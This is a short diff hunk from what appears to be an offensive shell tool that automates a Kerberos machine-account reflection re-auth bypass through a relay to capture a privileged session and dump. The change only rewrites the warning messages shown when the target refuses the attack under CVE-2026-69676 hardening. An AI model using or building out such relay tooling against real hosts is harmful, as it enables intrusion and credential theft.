@@ -365,11 +365,11 @@ cmd_auto() {
       success)
         ok "re-auth bypass SUCCEEDED - privileged session kept (dump may still be landing; see $rl).";;
       refused)
-        warn "re-auth bypass REFUSED by the target (0xC0000022 in $rl)."
-        warn "this host enforces the same-identity / machine-identity check on re-auth"
-        warn "(CVE-2026-69676; KB5124008 ships it as 'Machine Identity Isolation'): the swap cannot work here."
-        warn "note: patchcheck #4 only tests a USER->USER swap, so it can read 'absent' while the"
-        warn "MACHINE-account reflection the attack needs is still blocked. The relay is authoritative.";;
+        warn "re-auth bypass REFUSED by the target (0xC0000022 in $rl): the reflected re-auth was"
+        warn "rejected, consistent with the Sep-2026 same-identity hardening (CVE-2026-69676)."
+        warn "note: patchcheck #4 only tests an NTLM user->user swap, which differs from this live"
+        warn "Kerberos machine-account reflection in both identity and protocol - so #4 can read"
+        warn "'absent' while the live swap is refused. The relay is the authoritative test.";;
       none)
         warn "no reflected re-auth reached the relay within ${LOOT_WAIT}s."
         warn "most likely the victim could not reach your relay at $RELAY_IP - re-check -R reachability from the target subnet.";;
